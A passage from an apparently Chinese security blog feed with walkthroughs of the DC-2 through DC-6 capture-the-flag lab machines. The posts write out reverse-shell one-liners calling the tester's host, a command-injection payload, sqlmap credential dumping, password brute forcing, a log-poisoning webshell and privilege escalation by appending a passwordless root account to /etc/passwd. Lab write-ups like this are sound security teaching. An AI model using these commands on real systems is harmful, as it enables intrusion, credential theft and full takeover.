alt="img"></p><p>然后将其保存下来存入1.txt，接下来就是搞密码爆破了，但是并不能像dc-2那样使用cewl生成密码</p><p>这里需要用到作者的提示，</p><p><img src="/../dc-6/1735291764114-bb152dd6-748e-4522-9e6d-137439a343ec.png" alt="img"></p><p>使用命令</p><p>cat &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt | grep k01 &gt; passwords.txt</p><p><img src="/../dc-6/1735292310760-b7e90c40-c5b1-41e6-87a5-872fb6739a5f.png" alt="img"></p><p>使用wpscan进行账号爆破：(注意目录位置）</p><p>wpscan –url <a href="http://wordy/">http://wordy</a> -U 1.txt -P passwords.txt</p><p><img src="/../dc-6/1735292920681-6cfe98a7-c643-4ad9-a435-a28c0e5cd7cb.png" alt="img"></p><p>最后成功扫出来一个账户：mark   helpdesk01</p><p>然后发现了一个注入点，利用  | 执行了我们的命令，直接反弹shell</p><p><img src="/../dc-6/1735293950362-66677dca-63e3-4d0b-88bb-5f83977700af.png" alt="img"></p><p>kali开启监听，然后执行命令：127.0.0.1|nc 192.168.3.9 8888 -e &#x2F;bin&#x2F;bash</p><p><img src="/../dc-6/1735294128274-30b89321-5ced-4b26-9ab7-74ea6d9a461a.png" alt="img"></p><p>执行交互式shell</p><p>python -c “import pty;pty.spawn(‘&#x2F;bin&#x2F;bash’)”</p><p>然后在mark的账户里看到了一个账号</p><p><img src="/../dc-6/1735294473979-db6818d6-710f-4d0d-a888-057ee7ce0e20.png" alt="img"></p><p>graham</p><p>GSo7isUM1D4</p><p>开始以为是wordpress，然后发现是ssh</p><p><img src="/../dc-6/1735294786284-2858ae99-5c64-4a0b-82df-43e0c70ac954.png" alt="img"></p><p>查看graham可用的sudo命令<img src="/../dc-6/1735294876969-7af9d8f6-179b-4e99-af0b-77258e70a295.png" alt="img"></p><p>发现graham可以以jens的身份执行&#x2F;home&#x2F;jens&#x2F;backups.sh</p><p>&gt;：覆盖文件内容</p><p>&gt;&gt;：追加文件内容</p><p>我们可以通过添加一个shell，然后执行这个文件</p><p>追加一个shell：</p><p>echo “&#x2F;bin&#x2F;bash” &gt; backups.sh</p><p>然后以jens的身份执行这个文件：</p><p> sudo -u jens .&#x2F;backups.sh  </p><p>此时就拿到了jens的权限了：</p><p><img src="/../dc-6/1735295405171-e2f4b21e-348a-4725-8287-e89fe9de9c9f.png" alt="img"></p><p>然后查看jens可以执行的sudo命令（sudo提供的是root权限）</p><p><img src="/../dc-6/1735295583400-3532b254-4a72-4bd7-bf27-956dc3b6f318.png" alt="img"></p><p>使用nmap提权</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;os.execute(&quot;/bin/sh&quot;)&#x27; &gt; shell</span><br><span class="line">sudo  nmap  --script=shell</span><br></pre></td></tr></table></figure><p>最后拿到flag（输入的命令不见了）</p><p><img src="/../dc-6/1735295701462-9bf152a1-e028-4ace-96a2-822581bffa77.png" alt="img"></p>]]></content>
      
      
      
        <tags>
            
            <tag> DC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dc-5</title>
      <link href="/2025/04/04/dc-5/"/>
      <url>/2025/04/04/dc-5/</url>
      
        <content type="html"><![CDATA[<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><span id="more"></span><p><img src="/../dc-5/1735268343044-d652fac4-e2ee-47af-b0ae-3975c9639bae.png" alt="img"></p><p>mac地址：00:0C:29:DA:9E:39</p><p>arp-scan -l进行扫描，得到ip地址：192.168.3.56</p><p><img src="/../dc-5/1735268456242-4b36a510-0bd5-488b-99ac-7fc0b6163a8f.png" alt="img"> </p><p>然后nmap进行端口扫描：</p><p>nmap -A 192.168.3.56 -p 1-65535 </p><p><img src="/../dc-5/1735268595732-1f858e41-6c0a-488f-b547-c577d20410c6.png" alt="img"></p><p>发现开了一个80http服务，<img src="/../dc-5/1735270423053-80ee5359-190c-4272-9e3f-c19a2e63bf92.png" alt="img"></p><h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h2><p>然后用dirsearch扫描</p><p><img src="/../dc-5/1735270442766-61648d45-595f-44aa-b39d-4d93ac95f959.png" alt="img"></p><p>footer.php，显示了时间</p><p><img src="/../dc-5/1735270476844-22c9c97e-2f8b-4b4b-8dca-b7a0c46b6b0c.png" alt="img"></p><p>然后在concat.php的时候，点击提交的时候<img src="/../dc-5/1735270532681-5571cf7c-e6e0-4132-b5cf-de747340c0f0.png" alt="img"></p><p>转跳到thankyou.php会出现footerphp的页面，这里就猜测是thankyou.php包含了footer.php，存在文件包含漏洞</p><p><img src="/../dc-5/1735270630672-a9ecc99d-5fb8-493a-937b-df3cbac5ed8b.png" alt="img"></p><p>直接测试，发现成功了</p><p><img src="/../dc-5/1735270727635-bd4c1e37-dc31-4782-9e94-a05028cce892.png" alt="img"></p><h2 id="插入木马"><a href="#插入木马" class="headerlink" title="插入木马"></a>插入木马</h2><p>所以直接插入一句话木马，发包</p><p><img src="/../dc-5/1735271114688-5a8d29d8-178c-442c-8c6c-1ab4bf6874ff.png" alt="img"></p><p>因为执行的内容会被日志记录下来，它的日志会记录在：</p><p>&#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log或&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p><p>这样就达到了传🐎的效果</p><p>访问日志，最后在&#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log中找到了木马</p><p><img src="/../dc-5/1735271529204-24ce7bd2-bb09-4a1f-a0c4-720c8da3b4ce.png" alt="img"></p><p>然后直接蚁剑连接</p><p><img src="/../dc-5/1735271619113-8d1646ca-1148-41fd-8d35-c1a4fbd2292c.png" alt="img"></p><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>kali开启监听：</p><p><img src="/../dc-5/1735272718817-444b16ee-5fd9-43fb-b24c-a62b6bd51cee.png" alt="img"></p><p>用蚁剑执行：nc 192.168.3.9 8888 -e &#x2F;bin&#x2F;bash</p><p><img src="/../dc-5/1735272735760-759bb5e4-bca6-44bd-8df0-f7da8c68c790.png" alt="img"></p><p>成功反弹</p><p><img src="/../dc-5/1735272753836-2de3600d-7fc0-412c-b40f-b58fac8a0ea0.png" alt="img"></p><p>获取交互式页面</p><p>python -c “import pty;pty.spawn(‘&#x2F;bin&#x2F;bash’)”</p><h2 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h2><p>find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</p><p>发现screen-4.5.0</p><p><img src="/../dc-5/1735273426372-53ef184f-b429-450c-974a-fcf89d07a75b.png" alt="img"></p><p>kali本地搜索 screen 4.5.0 的漏洞脚本文件<img src="/../dc-5/1735274106775-d12014aa-33c1-4362-b8de-ea81eaf1aef4.png" alt="img"></p><p>使用locate命令寻找这个脚本文件的绝对路径:</p><p>locate  linux&#x2F;local&#x2F;41154.sh</p><p><img src="/../dc-5/1735275622475-aecd7f23-e490-41a3-bc8b-ad16255e00a0.png" alt="img"></p><p>将第一个脚本文件复制到root目录下</p><p><img src="/../dc-5/1735274593309-0e9b3995-fa03-4584-aa63-37f0ffc3844c.png" alt="img"></p><p><img src="/../dc-5/1735274677326-ace58fa6-7b23-4b32-ab0e-8a7bdd190bd9.png" alt="img"></p><h3 id="将第一部分写入libhax-c文件"><a href="#将第一部分写入libhax-c文件" class="headerlink" title="将第一部分写入libhax.c文件"></a>将第一部分写入libhax.c文件</h3><p>进入dc-5，创建一个libhax.c文件，刚刚得到的.c文件写入进去</p><p><img src="/../dc-5/1735274949149-e3b99c81-c29e-4742-b1cf-495dce16d871.png" alt="img"></p><p>使用命令编译这个文件：</p><p>gcc -fPIC -shared -ldl -o libhax.so libhax.c</p><p><img src="/../dc-5/1735275018851-11cd403f-9f12-405c-b021-779ef7c29e1d.png" alt="img"></p><h3 id="将第二部分写入rootshell-c并编译"><a href="#将第二部分写入rootshell-c并编译" class="headerlink" title="将第二部分写入rootshell.c并编译"></a>将第二部分写入rootshell.c并编译</h3><p><img src="/../dc-5/1735275400963-fda4fec7-5cf0-4c38-9c5b-353fa7908cef.png" alt="img"></p><p>编译：</p><p>gcc -fPIC -shared -ldl -o rootshell.so rootshell.c</p><p><img src="/../dc-5/1735275426704-228763e6-52c2-4f18-83ff-0ed2ad4aeead.png" alt="img"></p><h3 id="将第三部分写入dc5-sh文件"><a href="#将第三部分写入dc5-sh文件" class="headerlink" title="将第三部分写入dc5.sh文件"></a>将第三部分写入dc5.sh文件</h3><h2 id="上传脚本文件拿root"><a href="#上传脚本文件拿root" class="headerlink" title="上传脚本文件拿root"></a>上传脚本文件拿root</h2><p>使用winscp</p><p><img src="/../dc-5/1735278285459-f925775a-ed06-4ce4-85e0-1fadee9bea94.png" alt="img"></p><p>把脚本文件通过蚁剑上传，执行完后，就是root权限了</p><p><img src="/../dc-5/1735278241483-2be062be-e804-4911-8b4f-b41664f7d21f.png" alt="img"></p><p>拿到flag</p><p><img src="/../dc-5/1735278354586-ff2d0637-42c2-4497-a5f7-60ae2538549f.png" alt="img"></p><p>同样也可以用kali开启python服务，或者apach服务来上传脚本文件。</p>]]></content>
      
      
      
        <tags>
            
            <tag> DC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dc-4</title>
      <link href="/2025/04/04/dc-4/"/>
      <url>/2025/04/04/dc-4/</url>
      
        <content type="html"><![CDATA[<p>信息收集</p><span id="more"></span><p><img src="/../dc-4/1735200523635-b8231a2d-b489-4de0-8630-0d2e9a7b6ff4.png" alt="img"></p><p>得到目标靶机的mac地址（网络设备的硬件地址，用于标识设备在局域网 即  LAN 中的唯一性）</p><p>mac地址：00:0C:29:CC:EF:0E</p><p>使用命令扫描： arp-scan -l</p><p>得到ip：192.168.3.2</p><p><img src="/../dc-4/1735201238137-5a50ff96-04d4-4f1f-979d-fcb4e8478bd6.png" alt="img"></p><p>使用namp进行扫描：</p><p>nmap -A 192.168.3.2 -p 1-65535 -oN nmap.A </p><p>-A： 启用高级扫描功能，包括操作系统检测、服务版本检测、脚本扫描和路由跟踪  </p><p>192.168.3.2：目标主机的ip地址</p><p>-p 1-65535：扫描主机的所有端口，从1-65535</p><p>-oN nmap.A：将扫描结果以普通文本的格式保存到nmap.A中</p><p><img src="/../dc-4/1735201645071-be4e0cd1-efd5-4f2b-a2e2-62a41dda6e67.png" alt="img"></p><p>开启了80端口的http服务，直接访问，只是一个登录框，<img src="/../dc-4/1735202729180-1c782882-c97e-408b-8b39-a0d4f7e5345f.png" alt="img"></p><p>用whatweb -v 查看是不是常用的cms（ 内容管理系统  ）</p><p><img src="/../dc-4/1735202804446-19c05b88-a821-4072-818b-7ff5e811183e.png" alt="img"></p><p>并没有什么有用的信息，用dirsearch进行目录爆破<img src="/../dc-4/1735203066192-6179160c-51c5-4c52-84ef-bb5dfa9cdf66.png" alt="img"></p><p>结果基本上都重定向到index.php了。</p><p>尝试爆破，最后得到密码为happy<img src="/../dc-4/1735203845278-46c026da-1fe9-46d9-9e8d-e358cdf1b652.png" alt="img"></p><p>抓包可以看到执行命令的参数</p><p><img src="/../dc-4/1735205004013-85fbd04a-29ed-4f6d-9e76-16260fe79128.png" alt="img"></p><p>发现可以执行我们设置的命令</p><p><img src="/../dc-4/1735205113570-2a6d0929-5b6e-404a-adfe-3e94ca2e06f9.png" alt="img"></p><p>这里直接反弹shell，kali开启端口监听</p><p>nc -lvvp 8888</p><p>修改数据包</p><p>radio&#x3D;nc 192.168.3.9 8888 -e &#x2F;bin&#x2F;bash&amp;submit&#x3D;Run<img src="/../dc-4/1735205880143-e197582a-65fd-4ed8-a5c2-fdf1208150d7.png" alt="img"></p><p>成功反弹shell</p><p><img src="/../dc-4/1735205912064-8a13763f-49bc-490b-9874-bf5910a510e3.png" alt="img"></p><p>获取交互式页面（其实相对于shell就是方便，美观，稳定）</p><p>python -c “import pty;pty.spawn(‘&#x2F;bin&#x2F;bash’)”</p><p><img src="/../dc-4/1735206423214-06fca803-ca6f-4e77-b088-c783bb30027e.png" alt="img"></p><p>查看当前权限：whoami</p><p><img src="/../dc-4/1735210591305-6201dceb-1c21-4b0a-a056-bf182413b860.png" alt="img"></p><p>不是root权限</p><h2 id="第一种解法"><a href="#第一种解法" class="headerlink" title="第一种解法"></a>第一种解法</h2><p>查看具有suid权限的命令</p><p>find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</p><p><img src="/../dc-4/1735210714975-2936b489-1990-4c2b-a8a1-0295e214bbe4.png" alt="img"></p><p>发现一个 &#x2F;usr&#x2F;sbin&#x2F;exim4</p><p>exim4：用于处理电子邮件的发送，接收和路由</p><p>查看exim4版本：<br>exim4 –version</p><p><img src="/../dc-4/1735211779525-6c1b3e35-42a5-4965-821a-c2a3ee818da4.png" alt="img"></p><p>查看本地漏洞库</p><p><img src="/../dc-4/1735211932983-38d432f1-232c-4d3a-9f2c-c4378e574e44.png" alt="img"></p><p>因为版本为:4.89</p><p>所以选择这个：Exim 4.87 - 4.91 - Local Privilege Escalation                           | linux&#x2F;local&#x2F;46996.sh</p><p>启动kali的apache服务</p><p>systemctl start apache2.service  </p><p>将kali本地漏洞库的脚本复制到apache服务的web页面下</p><p>cp &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;local&#x2F;46996.sh &#x2F;var&#x2F;www&#x2F;html</p><p>可以看到本地访问的结果了</p><p><img src="/../dc-4/1735215061141-df0e2292-09f4-4926-8b93-7b905e90d158.png" alt="img"></p><p>在目标靶机中将这个脚本下载下来</p><p><img src="/../dc-4/1735215116190-afe7ca62-abb0-42b9-bf0e-be2a0b6bd845.png" alt="img"></p><p>显示文件夹权限不够，ls-l 查看只有读跟执行的权限。</p><p><img src="/../dc-4/1735215263246-840d907a-ddd4-4934-aa41-386bd4c3fe7b.png" alt="img"></p><p>在根目录发现有个可写的tmp目录<img src="/../dc-4/1735215362058-dae9fa7e-cb88-4327-b068-38c2a6ca219d.png" alt="img"></p><p>于是就在&#x2F;tmp这个目录下载kali服务的脚本</p><p><img src="/../dc-4/1735215463855-8fc15d85-1799-4a34-90a1-6f1c1dcdca4d.png" alt="img"></p><p>然后给与可执行权限（+x）</p><p>chmod +x 46996.sh</p><p>然后执行脚本</p><p>.&#x2F;46996.sh</p><p>等脚本执行完后发现已经是root权限了</p><p><img src="/../dc-4/1735215691246-8af63f85-e31e-4f23-92a2-28c298367ec2.png" alt="img"></p><p>然后进入到root目录就可以拿到flag了</p><p><img src="/../dc-4/1735215857021-85afaa22-5c02-4d44-8e48-ba0090f370e0.png" alt="img"></p><h2 id="第二种解法（teehee提权）"><a href="#第二种解法（teehee提权）" class="headerlink" title="第二种解法（teehee提权）"></a>第二种解法（teehee提权）</h2><p>进入到home目录，发现有三个账户，最后只有jim里有东西</p><p>然后在backups里发现一个备份文件，因为文件名有password所以猜测是一个储存密码的文件。</p><p>因为前面开了ssh，所以尝试用hydra爆破ssh</p><p>用法：</p><p>hydra -l <username> -P <password_file> ssh:&#x2F;&#x2F;<target_ip></p><p>在kali本地桌面创建一个passwd.txt用来存储.bak备份文件的内容</p><p>命令：</p><p>hydra -l jim -P passwd.txt 192.168.3.2 ssh</p><p><img src="/../dc-4/1735217007554-09f8486c-9ad2-49b6-9bba-5bccdded3dd3.png" alt="img"></p><p>然后通过ssh连接jim</p><p>ssh <a href="mailto:&#106;&#105;&#109;&#64;&#49;&#57;&#x32;&#46;&#49;&#x36;&#x38;&#46;&#x33;&#46;&#50;">jim@192.168.3.2</a></p><p>jibril04</p><p><img src="/../dc-4/1735217172878-9880a29c-c887-48cd-87ee-b2e9ab3dc767.png" alt="img"></p><p>然后发现jim里有一封邮件</p><p><img src="/../dc-4/1735217298258-c19a92dc-ad27-43bc-a45a-960aff3d56f2.png" alt="img"></p><p>进入邮件目录：cd &#x2F;var&#x2F;spool&#x2F;mail</p><p>可以看到一封来自charles的邮件，里面提供了charles的密码：^xHhA&amp;hvim0y</p><p><img src="/../dc-4/1735217387788-b9f96feb-bd58-429c-b18e-f3cf56ef95d8.png" alt="img"></p><p>然后直接通过su charles切换用户，输入密码</p><p><img src="/../dc-4/1735217627107-aa3568f7-f988-49e3-ba0a-0292c0cc236a.png" alt="img"></p><p>查看当前用户在系统中可以通过sudo命令执行的权限和规则</p><p>sudo -l</p><p><img src="/../dc-4/1735217817734-154178d2-88ec-4320-9bdf-e39acfe8078c.png" alt="img"></p><p>发现在charles当中的sudo -l 命令中存在以root权限执行的命令</p><p>teehee –help，查看用法</p><p><img src="/../dc-4/1735218315455-b9070e89-c04d-4f43-96bb-8131814f71b5.png" alt="img"></p><p>发现一个  -a用法，利用这点，可以直接向etc&#x2F;passwd中写入一些东西</p><p><img src="/../dc-4/1735218445900-1e808523-05fa-4ca3-b6ef-bb88c2a00966.png" alt="img"></p><p>利用管道符（  |  ）写入：admin::0:0:::&#x2F;bin&#x2F;bash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;admin::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd admin::0:0:::/bin/bash</span><br><span class="line"># 用户名admin 没有密码,第一个0表示超级用户，管理员权限 进入的时候运行/bin/bash</span><br></pre></td></tr></table></figure><p>直接切换admin用户，无需密码，因为前面添加的时候没有设置密码</p><p><img src="/../dc-4/1735219231147-dc724656-281d-44db-9139-0c80bd5affdb.png" alt="img"></p><p>可以看到直接为root权限了，最后进入root目录，拿到flag<img src="/../dc-4/1735219284642-c2298a33-e992-476e-9f8e-57e22252ffd5.png" alt="img"></p>]]></content>
      
      
      
        <tags>
            
            <tag> DC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dc-3</title>
      <link href="/2025/04/04/dc-3/"/>
      <url>/2025/04/04/dc-3/</url>
      
        <content type="html"><![CDATA[<p>信息搜集</p><span id="more"></span><p><img src="/../dc-3/1733123089958-5a6f29cc-5711-401b-a2cb-c9a0e7f18277.png" alt="img"></p><p>得到mac地址：00:0C:29:5A:61:54</p><p>然后通过arp-scan -l 扫描与kali同一网段上的ip</p><p><img src="/../dc-3/1733123135427-f163ef04-6965-40b3-b4b8-32d21042476e.png" alt="img"></p><p>得到ip地址：192.168.126.141</p><p>接着扫描这个ip所开放的端口</p><p>命令：nmap -A 192.168.126.141 -p 1-65535 -oN nmap.A</p><p><img src="/../dc-3/1733123808719-ecb73396-f3e0-482d-b9b6-070c2eb67e60.png" alt="img"></p><p>这里可以看到有开放的80端口</p><p>whatweb -v ip</p><p><img src="/../dc-3/1733124958579-1ead4a4b-37af-474f-be29-f1cf6f12378f.png" alt="img"></p><p>发现这个架构是一个Joomla</p><p><img src="/../dc-3/1733124332376-4ddacada-a869-4101-b3f1-2af07f503c15.png" alt="img"></p><p>最后得到一个信息，这次只有一个flag，然后最后要获得根目录权限</p><p>由上面得到这个网站的架构为Joomla，这里需要用到一个这个框架的扫描工具，joomscan，kali上需要自行安装</p><p>命令：</p><p>apt-get install joomscan -y</p><p>安装成功后使用命令：joomscan –url  <a href="http://192.168.126.141/">http://192.168.126.141/</a>  进行扫描</p><p><img src="/../dc-3/1733125363380-e372c7b3-dd0c-4e62-9cff-aa430f2a19f6.png" alt="img"></p><p>或者也可以使用其他漏洞工具进行扫描</p><p>dirb <a href="http://192.168.126.141/">http://192.168.126.141/</a></p><p>dirsearch -u  <a href="http://192.168.126.141/">http://192.168.126.141/</a></p><p>最后根据cms版本在网上找出来了一个sql注入漏洞，</p><p>直接上sqlmap，爆破当前数库：</p><p>sqlmap -u “<a href="http://192.168.126.141/index.php?option=com_fields&view=fields&layout=modal&list%5Bfullordering%5D=">http://192.168.126.141/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=</a>“ –current-db</p><p><img src="/../dc-3/1733130284362-aadc5f0e-7eb7-42db-b852-cc72972eed25.png" alt="img"></p><p>得到数据库：joomladb</p><p>然后爆破表名：</p><p>sqlmap -u “<a href="http://192.168.126.141/index.php?option=com_fields&view=fields&layout=modal&list%5Bfullordering%5D=">http://192.168.126.141/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=</a>“ -D joomladb -tables</p><p><img src="/../dc-3/1733130690762-ea5978e1-b7d5-449f-af8f-1fd2ceab9213.png" alt="img"></p><p>找到了一个   #__users</p><p>接着爆破列名，记得在这个表名加上双引号，防止#将后面的内容给注释掉</p><p>sqlmap -u “<a href="http://192.168.126.141/index.php?option=com_fields&view=fields&layout=modal&list%5Bfullordering%5D=">http://192.168.126.141/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=</a>“ -D “joomladb” -T “#__users” –columns</p><p><img src="/../dc-3/1733131768937-cf91299b-2ee5-4f7a-8157-d6b721a8f497.png" alt="img"></p><p>然后直接dump  username 和password</p><p>sqlmap -u “<a href="http://192.168.126.141/index.php?option=com_fields&view=fields&layout=modal&list%5Bfullordering%5D=">http://192.168.126.141/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=</a>“ -D “joomladb” -T “#__users” -C “username,password” –dump</p><p><img src="/../dc-3/1733131840123-28f8f88f-efb9-43d7-8a4f-c44aeaae6db5.png" alt="img"></p><p>最后得到了一个账号跟密码，不过密码是经过加密的，需要用kali中自带的john来破解，</p><p>现在桌面上创建一个1.txt，然后将哈希值放进去，最后执行命令：</p><p>john  1.txt</p><p><img src="/../dc-3/1733133099562-c99bb81c-54f7-4910-9ccc-afa24f2503ad.png" alt="img"></p><p>最后得到密码为：snoopy</p><p>然后在administrator这个目录下登录进后台</p><p><img src="/../dc-3/1733133263418-97c84f6b-7f1e-4606-a656-a898f72c1a66.png" alt="img"></p><p>然后在extensions部分可以上传文件</p><p><img src="/../dc-3/1733292084534-373c7741-2f53-4b9e-8db6-417839d20cf0.png" alt="img"></p><p>上传木马，最后成功连上<img src="/../dc-3/1733292105744-1ac33db7-0445-4d20-9790-ff96d69cbf1c.png" alt="img"></p><p><a href="http://192.168.3.252/templates/beez3/html/a.php">http://192.168.3.252/templates/beez3/html/a.php</a></p><p>查看当前用户：whoami</p><p><img src="/../dc-3/1733293182864-f835b46e-8907-449f-aa19-22f007495bcb.png" alt="img"></p><p>www-data是一个低权用户。所以还需要提权</p><p>查看系统内核：uname -a</p><p><img src="/../dc-3/1733293328651-fdaa46b0-32cf-49ae-b52b-098e0f2c98f5.png" alt="img"></p><p>查看ubuntu发行版本：lsb-release -a</p><p><img src="/../dc-3/1733293690081-806f0a81-206c-4ab9-9555-c4f0c84b8ddc.png" alt="img"></p><p>为ubuntu16.04</p><p>查找漏洞：</p><p>searchsploit ubuntu 16.04 linux</p><p><img src="/../dc-3/1733294076000-fb63c970-23d8-46d8-af8e-50508ccacada.png" alt="img"></p><p>选择linux&#x2F;local&#x2F;39772.txt这个。</p><p>cat &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;local&#x2F;39772.txt</p><p>最后会得到一个下载方式：</p><p><img src="/../dc-3/1733295262561-d52a6027-e428-4b2c-ac1d-9cbb33da2e6a.png" alt="img"></p><p>最后下载下来，将他放到html目录（templates）</p><p><img src="/../dc-3/1733295378232-a126b7b4-e9c2-4a23-8ba9-5dc881c9da0b.png" alt="img"></p><p>然后反弹shell，在kali上执行：nc -lvp 1234</p><p>蚁剑上执行：bash -c ‘bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.3.250&#x2F;1234 0&gt;&amp;1’ </p><p>拿到shell：</p><p><img src="/../dc-3/1733295449730-1dc4d555-c01f-48a9-933e-e9400e7cf0d4.png" alt="img"></p><p>将exploit.tar进行解压：tar -xvf exploit.tar</p><p><img src="/../dc-3/1733295915004-0b637bd9-cff5-4e49-bbe2-6724499a9f04.png" alt="img"></p><p>cd ebpf_mapfd_doubleput_exploit&#x2F;</p><p><img src="/../dc-3/1733295981623-1ab74bc9-96ba-4320-9b7f-3e04f8a98470.png" alt="img"></p><p>执行：.&#x2F;compile.sh</p><p><img src="/../dc-3/1733296038645-c094b996-3b6a-4208-947b-85061a34df61.png" alt="img"></p><p>执行完之后会多一个doubleput</p><p><img src="/../dc-3/1733296110452-a64c43ad-7243-47b8-99e4-fb85b4d80bca.png" alt="img">‘</p><p>接着继续执行doubleput：.&#x2F;doubleput</p><p>最后拥有root权限。就可以直接进入&#x2F;root，拿到最后的flag</p><p><img src="/../dc-3/1733296264562-0a9229c1-20fc-4ce7-bf5c-711f3c3d9e97.png" alt="img"></p>]]></content>
      
      
      
        <tags>
            
            <tag> DC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dc-2</title>
      <link href="/2025/04/04/dc-2/"/>
      <url>/2025/04/04/dc-2/</url>
      
        <content type="html"><![CDATA[<p>首先获取靶机mac地址：00:0C:29:AC:ED:D0</p><span id="more"></span><p><img src="/../dc-2/1732604487149-65d2315d-4006-487f-a675-1c89b32cb48e.png" alt="img"></p><p>使用arp-scan -l</p><p>扫描在同一c段上的地址</p><p><img src="/../dc-2/1732604605130-0d6288ab-d54d-4832-8cb4-b7e344fc8b56.png" alt="img"></p><p>发现目标：192.168.126.138</p><p>使用nmap扫描这个ip开放的端口</p><p><img src="/../dc-2/1732604762089-966dd3ce-e83b-465f-a523-c7d1c7047a85.png" alt="img"></p><p>或者使用这个命令：nmap -A 172.16.224.130 -p 1-65535 -oN nmap.A</p><p>然后编辑配置文件：</p><p>vim &#x2F;etc&#x2F;hosts </p><p>加入：</p><p>ip   dc-2</p><p>这个叫域名映射到ip</p><p>拿到第一个flag：</p><p><img src="/../dc-2/1732604794181-2de7c180-c645-423e-99b8-07b2e276a0e4.png" alt="img"></p><p>这里提示说密码，这里就要用到kali 里面的字典生成工具cewl 来爬取网站上面的数据做成一个字典</p><p>使用msfconsole进行目录扫描：</p><p>use auxiliary&#x2F;scanner&#x2F;http&#x2F;dir_scanner</p><p>然后设置参数</p><p><img src="/../dc-2/1732606580175-dc00129e-1868-47f8-a27e-896c908deb2c.png" alt="img"></p><p><img src="/../dc-2/1732606797879-3e4e9ade-21ce-4e69-89e0-f637bfbfd5fa.png" alt="img"></p><p>访问状态码为200的文件：</p><p><img src="/../dc-2/1732606713439-e043b71e-b10a-4c1f-a763-621b616ce483.png" alt="img">得到一大堆文件，里面没有什么有用的</p><p>然后的话从cms入手，因为网站是worldpress，</p><p><img src="/../dc-2/1732606993084-b87b635a-fd01-4c6a-9a33-e7b8ef2433e0.png" alt="img"></p><p>使用kali自带的worldpress扫描工具wpscan</p><p> wpscan –url <a href="http://dc-2/">http://dc-2</a> -e u  </p><p>-e：表示启用枚举功能</p><p>u：表示wpscan会列举这个worldpress网站上所有的账户</p><p><img src="/../dc-2/1732608375931-9d0a1692-541f-4eda-9ed5-4c57e5183d47.png" alt="img"></p><p>然后的话一共发现了三个用户</p><p><img src="/../dc-2/1732608392782-ad5d6a1b-bc25-4cd0-8690-590228c894cd.png" alt="img"></p><p>使用cewl生成密码</p><p>cewl <a href="http://dc-2/">http://dc-2/</a> &gt; passwd.txt</p><p>使用命令进行爆破：</p><p>wpscan –url <a href="http://dc-2/">http://dc-2/</a> -U name.txt -P passwd.txt</p><p>最后爆破出两个账户</p><p><img src="/../dc-2/1732711575107-cecc84d9-e175-4036-8845-544efc6fd33c.png" alt="img"></p><p> jerry &#x2F; adipiscing                                                                             </p><p>tom &#x2F; parturient </p><p>前面用御剑扫描出来了一个登录页面</p><p><img src="/../dc-2/1732711671588-a2ec92d7-501b-4da7-8831-b511774370c3.png" alt="img"></p><p>最后登进jerry这个账户发现flag2</p><p><img src="/../dc-2/1732711740589-a560493f-5683-4ab9-831b-bdab61c5632e.png" alt="img"></p><p><img src="/../dc-2/1732711781196-b709a3fa-aab5-4cd2-9582-4f3da408f6e4.png" alt="img"></p><p>使用命令：</p><p>nmap -sV 192.168.85.169 -p1-65535</p><p>对这个ip进行端口扫描，从1到65535</p><p>但是推荐使用：</p><p>nmap -A 192.168.126.138 -p 1-65535 -oN nmap.A</p><p><img src="/../dc-2/1732768280747-ef5773f3-ad11-4fc3-8232-5999f2c515f7.png" alt="img"></p><p>最后扫描出来有一个ssh连接的端口：7744</p><p>flag提示我们尝试另一种方式，所以就尝试ssh</p><p>上hydra（九头蛇）</p><p>命令：</p><p>hydra -L name.txt -P passwd.txt  ssh:&#x2F;&#x2F;192.168.126.138 -s 7744 -o hydra.ssh -vV</p><p>或者直接使用命令进行远程连接：ssh <a href="mailto:&#x74;&#x6f;&#109;&#x40;&#x31;&#x39;&#50;&#x2e;&#49;&#x36;&#x38;&#46;&#x31;&#x32;&#x36;&#46;&#x31;&#51;&#56;">tom@192.168.126.138</a> -p 7744</p><p>然后输入密码：parturient</p><p>连接成功</p><p><img src="/../dc-2/1732768723709-db8ff9e4-35d1-4b15-93cd-f4190f124bb9.png" alt="img"></p><p>得到flag3（因为cat 被禁了）</p><p><img src="/../dc-2/1732768993120-e625def1-4980-4a59-8548-46bfff06e14b.png" alt="img"></p><p><img src="/../dc-2/1732768948847-5d522a65-0d65-4dcc-aa3c-1a9c1cfeb8b0.png" alt="img"></p><p>这里来说一下rbash限制（<strong>Restricted bash）</strong></p><p>即受限制的bash，管理员可以通过指定普通用户的bash为rbash，以此来限制相关操作，简单来说，区别与一般的shell，他会限制一些行为，让一些命令无法执行</p><p>使用echo $PATH</p><p><img src="/../dc-2/1732769884591-f5bc79ca-6411-4cc9-9469-0c054b04d8cf.png" 